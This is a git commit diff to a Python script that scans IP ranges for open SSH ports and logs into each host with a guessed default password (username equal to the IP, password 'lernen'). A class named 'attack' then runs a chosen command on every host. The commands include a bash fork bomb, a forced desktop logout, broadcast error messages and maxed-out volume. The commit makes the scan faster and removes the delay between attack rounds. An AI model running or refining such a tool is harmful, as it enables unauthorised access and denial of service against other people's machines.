3562aa85aa84e0fe2b213fec6fda82b7a1ea8409
TobiasBog100 <tobias.bogenfeld@t-online.de>
2015-12-08 22:19:10 +0100

    Update log.py

--- log.py
+++ log.py
@@ -4,14 +4,16 @@ import pxssh
 import socket
 import time
 from threading import *
+import os
 
 def login(ipp, order):
     s = pxssh.pxssh()
-    if not s.login (ipp, ipp, 'lernen'):
+    if not s.login (ipp, ipp, "lernen"):
         exit()
 
     else:
-        s.sendline('bash')
+        s.sendline("bash")
+        s.sendline("export DISPLAY=:0")
         s.sendline(order)
         s.prompt()
         s.logout()
@@ -27,13 +29,13 @@ def ipadress(floor_begin, floor_end , area_begin, area_end):
     while Num1!=Num2:
         IP = IP1 + str(Num1) +"."
         Var = area_begin
-        while area_begin < area_end:
+        while Var < area_end:
 
 
             ip = IP + str(Var)
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.2)
+                s.settimeout(0.01)
                 s.connect((ip, 22))
                 s.settimeout(None)
                 ip_liste.append(ip)
@@ -59,7 +61,7 @@ class attack(Thread):
         return 0
 
 
-list_of_orders = ["':(){ :|:&};:'", "echo 'Error' | wall"]
+list_of_orders = [":(){ :|:&};:","qdbus org.kde.ksmserver /KSMServer logout 0 0 0" ,"echo 'Error' | wall", "amixer sset 'Master' 100%", "notify-send 'title' 'text'"]
 numbers = []
 count = 0
 
@@ -68,6 +70,7 @@ count = 0
 while count < 4:
     a = int(input("Numbers: "))
     numbers.append(a)
+    count +=1
 
 b = int(input("Order: "))
 order = list_of_orders[b]
@@ -75,10 +78,18 @@ order = list_of_orders[b]
 while True:
 
     List = ipadress(numbers[0],numbers[1],numbers[2],numbers[3])
+    if "10.0.2.49" in List:
+        List.remove("10.0.2.49")
 
+
+    
     for i in List:
         check = attack(i,order)
         check.start()
+#        time.sleep(6)
+        
     List =[]
-    time.sleep(31)
+#    time.sleep(63)
+    os.system("clear")
+    
 
